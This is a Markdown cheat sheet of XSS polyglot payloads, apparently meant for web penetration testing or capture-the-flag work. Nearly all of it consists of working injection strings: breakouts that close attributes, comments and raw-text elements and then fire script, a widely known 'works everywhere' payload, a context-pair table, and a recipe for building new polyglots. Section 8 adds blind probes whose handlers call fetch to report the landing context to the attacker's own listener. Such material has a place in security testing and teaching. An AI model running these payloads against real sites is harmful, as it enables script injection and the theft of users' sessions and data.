# Polyglots — payloads that survive multiple contexts

A polyglot works in several contexts at once — needed when you
don't know the exact injection point, or the same input lands in
two contexts (name field renders in `<title>` AND a `<div>`).

---

## 1. The canonical polyglots — one string, many fires

```javascript
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
   -- fires in: URL attr (javascript:), HTML body, attribute value
   -- the */[]/ */ comment-pair works around block-quote filters
```

```javascript
'"><img src=x onerror=alert(1)>//'
   -- escapes " or ' attr → img in body; the // comments the tail
```

```html
'"></script><img src=x onerror=alert(1)>
   -- closes attr + script block + injects img
```

```javascript
"-alert(1)-"
   -- " closes attr-string → expression runs → -" merges

'-alert(1)-'
   -- ' variant
```

---

## 2. The breakout families — each layer peeled

A good polyglot peels contexts outside-in. The classic chain:

```text
</textarea></style></title></script></xmp>
   -- closes every raw-text/script context first
'">
   -- then breaks out of whichever quote wraps you
<svg/onload=alert(1)>
   -- then the firing tag
```

```javascript
-->'"/></title></textarea></style></noscript></noembed></xmp>
</template></script><svg onload=alert(1)>
   -- the full-context breakout — covers comment, attr, raw-text
```

The ordering matters: `-->` closes comments, `">` closes attrs, the
`</x>` sequence closes raw-text elements, then the firing tag.

---

## 3. JS-safe polyglots — run in script AND markup

```javascript
'-alert(1)-'
   -- ' str context: closes string, -alert(1)- runs, '-' opens next
"-alert(1)-"
   -- " variant
'-alert(1)//'
   -- tail-comment variant
```

```javascript
'</script><svg onload=alert(1)>
   -- in a JS string OR markup — the </script> escape works from
      inside a string (HTML parser doesn't see JS context)
```

```javascript
*/alert(1);/*
   -- inside /* */ block comment: closes, runs, reopens
```

---

## 4. The two-context payloads — name field in title AND body

```html
</title><img src=x onerror=alert(1)>
   -- <title>x</title> gets closed → img fires in body
   -- works when the input lands in <title> (raw-text)
```

```html
"><img src=x onerror=alert(1)><"
   -- attr-escape + img + open a new attr — leaves well-formed
```

```html
x onfocus=alert(1) autofocus x="
   -- unquoted-attr escape that ends in a quote to absorb the
      tag's own closing quote
```

---

## 5. The "works everywhere" megapayload

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//
</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//
>\x3e
   -- the famous one — covers: javascript: scheme, comment-closes,
      template literal escapes, attr escapes, tag escapes
   -- keep as reference — it's fragile and filters often eat it
```

Cleaner per-context-pair variants are usually better than the one
that tries everything.

---

## 6. The context-pair table

| Landing context | Payload that works in both |
|---|---|
| `"` attr + HTML body | `"><img src=x onerror=alert(1)>` |
| `'` attr + HTML body | `'><svg onload=alert(1)>` |
| JS string `"` + body | `"</script><img src=x onerror=alert(1)>` |
| JS string `'` + body | `'</script><svg onload=alert(1)>` |
| `<title>` + body | `</title><img src=x onerror=alert(1)>` |
| `<textarea>` + body | `</textarea><svg onload=alert(1)>` |
| `<!-- -->` + body | `--><img src=x onerror=alert(1)>` |
| URL attr + body | `javascript:alert(1)//"><svg onload=alert(1)>` |
| template `${}` + body | `${alert(1)}<img src=x onerror=alert(1)>` |
| `<style>` + body | `</style><img src=x onerror=alert(1)>` |
| `<xmp>` + body | `</xmp><svg onload=alert(1)>` |

---

## 7. The "each layer escapes the next" construction method

To build a polyglot for contexts [A, B, C]:

```text
1. find the escape-string for the OUTERMOST context
   (attr quote / comment close / raw-text close)
2. append the firing tag that works in the NEXT context
3. append an absorber that keeps the result well-formed in the
   remaining contexts (a comment-open, a stray quote, <!--)
4. test each candidate against EVERY context separately — a
   polyglot that fires in one and breaks in another is just a
   context payload
```

The absorber trick — after your firing tag, leave the document
well-formed:

```html
"><img src=x onerror=alert(1)><x y="
   -- the trailing <x y=" opens a new tag+attr that absorbs the
      original tag's closing quote — the page stays well-formed
```

```html
"><img src=x onerror=alert(1)><!--
   -- comment-open absorbs everything after
```

---

## 8. The blind-context probes — when you can't see the response

Admin-bot flows don't show you the rendered output — fire a
diagnostic that exfils the landing context:

```html
"><img src=x onerror="fetch('//me/?ctx=attr-'+this.parentNode.tagName)">
   -- the handler reports WHERE it landed

<svg onload="fetch('//me/?ctx=svg')">
   -- the svg-only variant — if it fires, svg context was live
```

For each hypothesis, a marker that reports back — the request to
your listener names the context that fired.

---

## 9. The "unknown-context" starter set — first three probes

```text
1. <img src=x onerror="XSS_PROBE_a">   -- the body probe
2. "><img src=x onerror="XSS_PROBE_b"> -- the attr-break probe
3. </title><img src=x onerror="XSS_PROBE_c"> -- the raw-text probe
```

Each marker names the context — whichever fires tells you which
file to pull next. Keep the marker scheme consistent (`XSS_PROBE_`
prefix + a context letter) so the logs identify the source.

---

## 10. Fragility notes — why polyglots fail

- a filter eating `</` kills every raw-text close
- a filter eating `on` kills every handler
- CSP nonce-requirement kills unnonced scripts
- the firing tag inside an ignored context never fires
- the absorber failing leaves the page broken — the BOT may see a
  blank page and never reach your firing tag in a stored scenario

Test the polyglot against each context STANDALONE first, then the
combined string — the combined string's success in all contexts is
the real evidence.
